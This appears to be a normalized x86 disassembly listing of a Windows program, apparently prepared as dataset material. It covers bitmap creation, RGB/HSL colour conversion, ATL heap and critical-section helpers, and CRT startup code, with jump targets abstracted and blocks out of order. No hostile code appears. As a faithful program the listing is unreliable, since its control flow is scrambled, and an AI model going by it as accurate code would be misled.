add ecx 0x10
add eax 0x10
dec edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
push ebx
push esi
push ecx
mov [ ebp - 0x4 ] ebx
call [ CreateDIBSection@IAT ]
mov edi eax
mov eax [ ebp + 0x18 ]
cmp eax ebx
je r-xdata
push esi
call [ free@IAT ]
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
cmp ecx ebx
jbe r-xdata
mov ecx [ ebp + 0xc ]
imul ecx [ ebp + 0x10 ]
push ecx
push eax
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x4 ]
push ecx
push eax
push edx
jmp r-xdata
call memcpy
add esp 0xc
sub_443250
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi edx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x41c ] ecx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
mov eax [ esi + 0x16 ]
imul eax [ esi + 0x12 ]
push ebx
lea ebx [ esi + 0xe ]
mov [ ebp - 0x40c ] eax
lea eax [ edi - 0x36 ]
test eax eax
je r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
movzx eax [ ebx + 0xe ]
cmp eax 0x18
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax 0x20
je r-xdata
push edi
call sub_443fa9
push edi
push esi
push eax
mov [ ebp - 0x410 ] eax
call memcpy
movzx eax [ ebx + 0xe ]
add esp 0x10
cmp eax 0x18
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp eax 0x8
je r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebx + 0x4 ]
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 8 + 0x1f ]
sar ecx 0x3
and ecx 0xfffffffc
cmp [ ebx + 0x8 ] 0x0
mov [ ebp - 0x40c ] ecx
mov [ ebp - 0x414 ] 0x0
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp eax 0x10
jne r-xdata
mov eax [ ebp - 0x40c ]
test eax eax
jle r-xdata
mov edi [ ebp - 0x410 ]
mov eax [ ebp - 0x41c ]
push 0x0
push ebx
lea edx [ edi + 0x36 ]
push edx
push 0x4
push ebx
push eax
call [ CreateDIBitmap@IAT ]
push edi
mov esi eax
call [ `placement delete closure'@IAT ]
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x410 ]
add esi 0x38
mov [ ebp - 0x418 ] esi
lea esp [ esp ]
push 0x0
push ebx
add esi 0x36
push esi
push 0x4
push ebx
push ecx
call [ CreateDIBitmap@IAT ]
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
cmp eax 0x8
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx eax
shl ecx 0x4
add ecx 0x1f
sar ecx 0x3
and ecx 0xfffffffc
cmp [ ebx + 0x8 ] 0x0
mov [ ebp - 0x40c ] ecx
mov [ ebp - 0x418 ] 0x0
jle r-xdata
mov esi [ ebp - 0x410 ]
add esi 0x38
mov edi eax
mov edx [ ebp - 0x414 ]
mov esi [ ebp - 0x418 ]
inc edx
add esi ecx
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x418 ] esi
cmp edx [ ebx + 0x8 ]
jl r-xdata
lea ebx [ ebx ]
mov esi [ esi + 0xa ]
mov [ ebp - 0x40c ] esi
cmp esi 0x412
jae r-xdata
mov esi [ ebp - 0x410 ]
add esi 0x36
mov [ ebp - 0x414 ] esi
add esi 0x4
dec edi
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
lea eax [ ebp - 0x405 ]
push eax
lea ecx [ ebp - 0x406 ]
push ecx
lea edx [ ebp - 0x407 ]
push edx
call sub_443830
mov al [ ebp - 0x405 ]
mov cl [ ebp - 0x406 ]
mov dl [ ebp - 0x407 ]
mov [ esi - 0x2 ] al
mov [ esi - 0x1 ] cl
mov [ esi ] dl
xor edi edi
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
inc edi
add esi 0x3
cmp edi eax
jl r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
lea eax [ ebp - 0x405 ]
push eax
lea ecx [ ebp - 0x406 ]
push ecx
lea edx [ ebp - 0x407 ]
push edx
call sub_443830
mov al [ ebp - 0x405 ]
mov cl [ ebp - 0x406 ]
mov dl [ ebp - 0x407 ]
mov [ esi - 0x2 ] al
mov [ esi - 0x1 ] cl
mov [ esi ] dl
mov esi [ ebp - 0x410 ]
add esi 0x12
mov ecx 0x100
lea edi [ ebp - 0x404 ]
[ edi ] [ esi ]
xor esi esi
lea ecx [ ecx ]
mov edx [ ebp - 0x418 ]
mov esi [ ebp - 0x414 ]
inc edx
add esi ecx
mov [ ebp - 0x418 ] edx
mov [ ebp - 0x414 ] esi
cmp edx [ ebx + 0x8 ]
jl r-xdata
nop
mov al [ esi - 0x2 ]
mov cl [ esi - 0x1 ]
mov dl [ esi ]
mov [ ebp - 0x405 ] al
movzx eax al
mov [ ebp - 0x406 ] cl
shl eax 0x8
movzx ecx cl
or eax ecx
mov [ ebp - 0x407 ] dl
movzx edx dl
shl eax 0x8
or eax edx
cmp eax 0xff00ff
je r-xdata
jmp r-xdata
mov al [ esi - 0x2 ]
mov cl [ esi - 0x1 ]
mov dl [ esi ]
mov [ ebp - 0x405 ] al
movzx eax al
mov [ ebp - 0x406 ] cl
shl eax 0x8
movzx ecx cl
or eax ecx
mov [ ebp - 0x407 ] dl
movzx edx dl
shl eax 0x8
or eax edx
cmp eax 0xff00ff
je r-xdata
mov ecx [ ebp - 0x40c ]
movzx edx [ ebp + esi * 4 - 0x402 ]
movzx eax [ ebp + esi * 4 - 0x403 ]
movzx ecx [ ebp + esi * 4 - 0x404 ]
mov [ ebp - 0x407 ] dl
mov edx [ ebp + 0x14 ]
push edx
mov [ ebp - 0x406 ] al
mov eax [ ebp + 0x10 ]
push eax
mov [ ebp - 0x405 ] cl
mov ecx [ ebp + 0xc ]
push ecx
lea edx [ ebp - 0x405 ]
push edx
lea eax [ ebp - 0x406 ]
push eax
lea ecx [ ebp - 0x407 ]
push ecx
call sub_443830
movzx edx [ ebp - 0x407 ]
movzx eax [ ebp - 0x406 ]
movzx ecx [ ebp - 0x405 ]
mov [ ebp + esi * 4 - 0x402 ] dl
mov [ ebp + esi * 4 - 0x403 ] al
mov [ ebp + esi * 4 - 0x404 ] cl
inc esi
cmp esi 0x100
jl r-xdata
mov eax [ ebp - 0x40c ]
mov edi [ ebp - 0x410 ]
mov ecx [ ebx + 0x14 ]
lea edx [ ebp - 0x404 ]
push edx
mov edx [ ebx + 0x8 ]
add eax edi
push eax
mov eax [ ebx + 0x4 ]
push ecx
mov ecx [ ebp - 0x41c ]
push edx
push eax
push ecx
call sub_443140
push edi
mov esi eax
call [ `placement delete closure'@IAT ]
add esp 0x1c
pop ebx
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
xor edi edi
test eax eax
jle r-xdata
jmp r-xdata
movzx eax [ esi ]
movzx edx [ esi ]
mov ecx eax
shr eax 0x2
add dl dl
shr ecx 0x7
and al 0xf8
and cl 0xf8
add dl dl
mov [ ebp - 0x406 ] al
mov eax [ ebp + 0x14 ]
push eax
add dl dl
mov [ ebp - 0x405 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
mov [ ebp - 0x407 ] dl
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x407 ]
push eax
lea ecx [ ebp - 0x406 ]
push ecx
lea edx [ ebp - 0x405 ]
push edx
call sub_443830
movzx eax [ ebp - 0x405 ]
movzx edx [ ebp - 0x406 ]
mov ecx 0xfff8
and ax cx
shl ax 0x5
or ax dx
movzx edx [ ebp - 0x407 ]
and ax cx
add ax ax
shr dl 0x3
add ax ax
movzx ecx dl
or ax cx
mov [ esi ] ax
mov eax [ ebx + 0x4 ]
inc edi
add esi 0x2
cmp edi eax
jl r-xdata
mov ecx [ ebp - 0x40c ]
sub_443730
test eax eax
jns r-xdata
cmp eax 0x168
jle r-xdata
add eax 0x168
jmp r-xdata
cmp eax 0x3c
jge r-xdata
sub eax 0x168
cmp eax 0xb4
jl r-xdata
sub ecx esi
imul ecx eax
mov eax 0x80808081
imul ecx
add edx ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add eax edx
retn
cmp eax 0xf0
jge r-xdata
mov eax 0x80808081
imul esi
add edx esi
sar edx 0x7
mov eax edx
shr eax 0x1f
add eax edx
retn
mov edx 0xf0
sub ecx esi
sub edx eax
imul ecx edx
jmp r-xdata
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
add ecx esi
sub_4437b0
push ebp
mov ebp esp
test ecx ecx
jne r-xdata
lea edx [ eax + eax ]
push esi
push edi
cmp edx 0xff
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] al
mov ecx [ ebp + 0x10 ]
mov [ ecx ] al
mov [ edx ] al
pop ebp
retn
mov edi 0xff
sub edi eax
imul edi ecx
mov ecx eax
imul ecx ecx 0xff
add edi ecx
lea edi [ ecx + 0xff ]
imul edi eax
jmp r-xdata
imul eax eax 0x1fe
sub eax edi
mov esi eax
lea eax [ ebx + 0x78 ]
mov ecx edi
call sub_443730
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax ebx
mov ecx edi
call sub_443730
mov ecx [ ebp + 0xc ]
mov [ ecx ] al
lea eax [ ebx - 0x78 ]
mov ecx edi
call sub_443730
mov edx [ ebp + 0x10 ]
pop edi
pop esi
mov [ edx ] al
pop ebp
retn
sub_443830
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
mov edx [ ebp + 0x10 ]
sub esp 0x10
push ebx
push esi
push edi
movzx edi [ edx ]
mov edx eax
cmp eax ecx
jl r-xdata
cmp edx edi
jge r-xdata
mov edx ecx
mov edx edi
cmp eax ecx
jge r-xdata
cmp esi edi
jle r-xdata
mov esi ecx
mov edx ecx
jmp r-xdata
mov edx eax
jmp r-xdata
lea ecx [ edi + edx ]
mov esi edi
mov eax ecx
sub esi edx
sar eax 0x1
xor ebx ebx
mov [ ebp - 0x10 ] eax
cmp esi ebx
jne r-xdata
mov edi eax
cmp eax ecx
jg r-xdata
mov esi eax
cmp eax ecx
jg r-xdata
add eax eax
mov edx esi
shl edx 0xa
cmp eax 0xff
mov eax esi
jg r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov edi ecx
shl eax 0x12
sub eax edx
mov edx 0x1fe
sub edx ecx
mov [ ebp - 0xc ] edx
cdq
idiv [ ebp - 0xc ]
shl eax 0x12
sub eax edx
cdq
idiv ecx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4437b0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0xc ]
movzx ecx [ ecx ]
cmp ecx edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx eax
shl ebx 0x4
add ebx ecx
shl ebx 0x6
shl eax 0x6
sub ebx eax
shl ecx 0xa
sub ebx ecx
sar ebx 0x11
add ebx 0x168
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
sar eax 0xa
mov [ ebp - 0x4 ] eax
mov eax edi
sub eax ecx
shl eax 0xd
cdq
idiv esi
mov edx [ ebp + 0xc ]
movzx edx [ edx ]
mov [ ebp - 0xc ] eax
mov eax edi
sub eax edx
shl eax 0xd
cdq
idiv esi
mov edx [ ebp + 0x10 ]
movzx edx [ edx ]
mov [ ebp - 0x8 ] eax
mov eax edi
sub eax edx
shl eax 0xd
cdq
idiv esi
cmp ecx edi
jne r-xdata
mov eax [ ebp + 0x10 ]
movzx eax [ eax ]
cmp eax edi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov ebx ecx
shl ebx 0x4
add ebx eax
shl ebx 0x6
shl eax 0xa
sub ebx eax
shl ecx 0x6
sub ebx ecx
sar ebx 0x11
add ebx 0x78
jmp r-xdata
mov ecx [ ebp + 0x18 ]
add ebx [ ebp + 0x14 ]
test ecx ecx
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ebx ecx
shl ebx 0x4
add ebx eax
shl ebx 0x6
shl ecx 0x6
sub ebx ecx
shl eax 0xa
sub ebx eax
sar ebx 0x11
add ebx 0xf0
mov eax 0xff
sub eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov ecx 0xff
sub ecx eax
mov ecx eax
jmp r-xdata
mov edx [ ebp + 0x1c ]
imul eax ecx
sar eax 0x7
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
test edx edx
jg r-xdata
cmp ebx 0x168
jle r-xdata
add ebx 0x168
jmp r-xdata
imul ecx edx
sar ecx 0x7
add eax ecx
test ebx ebx
jns r-xdata
sub ebx 0x168
sub_443a40
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax ]
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
push [ ecx + 0x4 ]
call [ HeapReAlloc@IAT ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
xor eax eax
jmp r-xdata
pop ebp
retn 0x8
sub_443a91
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4439f1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_443ad1
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_443af3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
jae r-xdata
add eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
mov eax 0x80070216
pop ebp
retn
sub_443b19
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
add esi 0x8
and esi 0xfffffff8
lea eax [ ebp + 0x8 ]
push esi
push eax
mov edi ecx
call sub_40ff70
add esp 0xc
test eax eax
js r-xdata
xor eax eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push 0x10
push eax
call sub_443af3
add esp 0xc
test eax eax
js r-xdata
mov ecx [ edi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax ]
test eax eax
je r-xdata
dec esi
and [ eax + 0x4 ] 0x0
mov [ eax ] edi
mov [ eax + 0xc ] 0x1
mov [ eax + 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_443b7d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
add esi 0x8
and esi 0xfffffff8
lea eax [ ebp + 0xc ]
push esi
push eax
mov edi ecx
call sub_40ff70
add esp 0xc
test eax eax
js r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push 0x10
push eax
call sub_443af3
add esp 0xc
test eax eax
js r-xdata
push [ ebp + 0xc ]
mov ecx [ edi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
dec esi
mov [ eax + 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
sub_443bd8
mov edi edi
push esi
mov esi ecx
push 0x18
lea eax [ esi + 0x14 ]
push 0x0
push eax
call memset
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
add esp 0xc
mov eax esi
pop esi
retn
sub_443c15
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
lea edi [ esi + 0x14 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x30 ]
mov eax [ ebp + 0x8 ]
cmp eax ecx
jg r-xdata
push edi
call [ LeaveCriticalSection@IAT ]
xor eax eax
test eax eax
js r-xdata
cmp eax ecx
jne r-xdata
jge r-xdata
mov esi [ esi + 0x8 ]
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
mov ecx [ esi + 0x2c ]
mov esi [ ecx + eax * 4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
push edi
call [ LeaveCriticalSection@IAT ]
mov eax esi
jmp r-xdata
sub_443c72
mov edi edi
push esi
mov esi ecx
call sub_443bd8
mov eax __dos_header
lea ecx [ esi + 0x14 ]
mov [ esi ] 0x38
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] 0xa00
mov [ esi + 0x10 ] r--data
call sub_40f190
test eax eax
jns r-xdata
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
sub_443cb2
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push ebx
mov ebx [ esi + 0x8 ]
cmp ebx [ esi + 0xc ]
jae r-xdata
lea eax [ esi + 0x10 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
pop ebx
push edi
add ebx 0x4
cmp ebx [ esi + 0xc ]
jb r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov edi [ ebx ]
test edi edi
je r-xdata
pop edi
and [ edi + 0x10 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_443d0f
mov edi edi
push esi
mov esi ecx
call sub_443cf6
and [ esi ] 0x0
lea ecx [ esi + 0x10 ]
mov [ esi + 0x4 ] __dos_header
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
call sub_40f190
test eax eax
jns r-xdata
mov [ esi ] 0x28
mov [ rw-data ] 0x1
jmp r-xdata
mov eax esi
pop esi
retn
sub_443d50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x2c
jne r-xdata
mov eax 0x80070057
jmp r-xdata
and [ eax + 0x1c ] 0x0
lea ecx [ eax + 0x4 ]
call sub_40f190
pop ebp
retn 0x4
sub_443d78
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call free
and [ esi ] 0x0
pop ecx
sub_443d97
mov edi edi
push esi
mov esi ecx
push 0x18
lea eax [ esi + 0x4 ]
push 0x0
push eax
call memset
and [ esi + 0x20 ] 0x0
and [ esi + 0x24 ] 0x0
and [ esi + 0x28 ] 0x0
add esp 0xc
mov eax esi
pop esi
retn
sub_443dbc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax 0x80070057
jmp r-xdata
xor eax eax
cmp eax 0x2c
jne r-xdata
pop esi
pop ebp
retn 0x8
push edi
xor edi edi
cmp [ esi + 0x24 ] edi
jle r-xdata
lea ecx [ esi + 0x20 ]
call sub_443d78
lea eax [ esi + 0x4 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
pop edi
test edi edi
js r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ esi + 0x24 ]
jge r-xdata
mov eax [ esi + 0x20 ]
movzx eax [ eax + edi * 2 ]
push [ ebp + 0xc ]
push eax
call [ UnregisterClassA@IAT ]
inc edi
cmp edi [ esi + 0x24 ]
jl r-xdata
sub_443e32
mov edi edi
push esi
mov esi ecx
call sub_443d97
push esi
mov [ esi ] 0x2c
call sub_443d50
test eax eax
jns r-xdata
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
and [ esi ] 0x0
sub_443e5a
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
push eax
call [ InterlockedPushEntrySList@IAT ]
pop ebp
retn
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
pop ebp
retn
sub_443e86
push 0xc
call [ IsProcessorFeaturePresent@IAT ]
test eax eax
jne r-xdata
mov eax [ fs : 0x18 ]
push ebx
push esi
mov esi [ eax + 0x30 ]
add esi 0x34
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
inc eax
mov [ rw-data ] eax
retn
mov [ rw-data ] eax
xor eax eax
inc eax
mov ebx [ GetProcessHeap@IAT ]
push 0x8
push eax
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edi eax
xor eax eax
cmp edi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push eax
push edi
push esi
mov [ edi ] eax
mov [ edi + 0x4 ] eax
call [ InterlockedCompareExchange@IAT ]
test eax eax
je r-xdata
mov eax [ esi ]
push edi
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
sub_443f06
cmp [ rw-data ] 0x0
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_443e86
test eax eax
je r-xdata
mov edi [ InterlockedPopEntrySList@IAT ]
push eax
call edi
test eax eax
jne r-xdata
push 0xd
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
push 0x40
mov eax 0x1000
push eax
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
push [ rw-data ]
call edi
mov edi eax
test edi edi
je r-xdata
lea edi [ esi + 0xff0 ]
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
mov eax edi
jmp r-xdata
push esi
push [ rw-data ]
call [ InterlockedPushEntrySList@IAT ]
add esi 0x10
cmp esi edi
jb r-xdata
mov eax esi
sub_443fc9
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x2
push edi
mov edi ecx
je r-xdata
call ?_type_info_dtor_internal_method@type_info@@QAEXXZ
test [ ebp + 0x8 ] 0x1
je r-xdata
push esi
push ?_type_info_dtor_internal_method@type_info@@QAEXXZ
lea esi [ edi - 0x4 ]
push [ esi ]
push 0xc
push edi
call sub_444073
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
push edi
call ??3@YAXPAX@Z
pop ecx
mov eax esi
pop esi
jmp r-xdata
push esi
call operator delete
pop ecx
pop edi
pop ebp
retn 0x4
sub_444015
push 0x14
push r--data
call sub_444610
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_444655
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_444038
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_444655
retn 0x10
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_444073
push 0xc
push r--data
call sub_444610
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4440be
call sub_444655
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_4440ee
push 0x14
push r--data
call sub_444610
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x8
call _lock
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
call esi
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call esi
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
mov esi [ EncodePointer@IAT ]
call esi
push eax
call __dllonexit
add esp 0xc
mov [ ebp - 0x24 ] eax
push [ ebp - 0x1c ]
call esi
mov [ rw-data ] eax
push [ ebp - 0x20 ]
call esi
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_444186
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ _onexit@IAT ]
pop ecx
jmp r-xdata
call sub_444655
retn
sub_4441a6
push 0x10
push r--data
call sub_444610
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4441f3
call sub_444655
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_44420b
push sub_44471c
call sub_44418f
mov eax [ rw-data ]
mov [ esp ] rw-data
push [ rw-data ]
mov [ rw-data ] eax
push rw-data
push rw-data
push rw-data
call [ __wgetmainargs@IAT ]
add esp 0x14
mov [ rw-data ] eax
test eax eax
jns r-xdata
retn
push 0x8
call _amsg_exit
pop ecx
sub_444256
push 0x5c
push r--data
call sub_444610
xor ebx ebx
mov [ ebp - 0x1c ] ebx
lea eax [ ebp - 0x6c ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ rw-data ] ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ fs : 0x18 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x20 ] ebx
mov edi rw-data
push ebx
push ebx
push 0x1
push ebx
call [ HeapSetInformation@IAT ]
xor esi esi
inc esi
cmp eax esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1f
call _amsg_exit
pop ecx
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
xor esi esi
inc esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov [ rw-data ] esi
mov [ rw-data ] esi
push r--data
push r--data
call _initterm_e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
push ebx
push esi
push edi
call [ InterlockedCompareExchange@IAT ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
push r--data
push r--data
call _initterm
pop ecx
pop ecx
mov [ rw-data ] 0x2
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
push ebx
push edi
call [ InterlockedExchange@IAT ]
call sub_444655
retn
mov eax [ _wcmdln@IAT ]
mov eax [ eax ]
push rw-data
call sub_4447e0
pop ecx
test eax eax
je r-xdata
cmp ecx 0x22
jne r-xdata
cmp cx bx
je r-xdata
push ebx
push 0x2
push ebx
call [ rw-data ]
add eax 0x2
jmp r-xdata
xor ecx ecx
cmp [ ebp - 0x1c ] ebx
sete cl
mov [ ebp - 0x1c ] ecx
movzx ecx [ eax ]
cmp cx bx
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov [ ebp - 0x24 ] eax
movzx ecx [ eax ]
cmp ecx 0x20
ja r-xdata
test [ ebp - 0x40 ] 0x1
je r-xdata
cmp ecx 0x20
ja r-xdata
push 0xa
pop ecx
movzx ecx [ ebp - 0x3c ]
jmp r-xdata
add eax 0x2
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push eax
call [ exit@IAT ]
push ecx
push eax
push ebx
push __dos_header
call sub_403ae0
mov [ rw-data ] eax
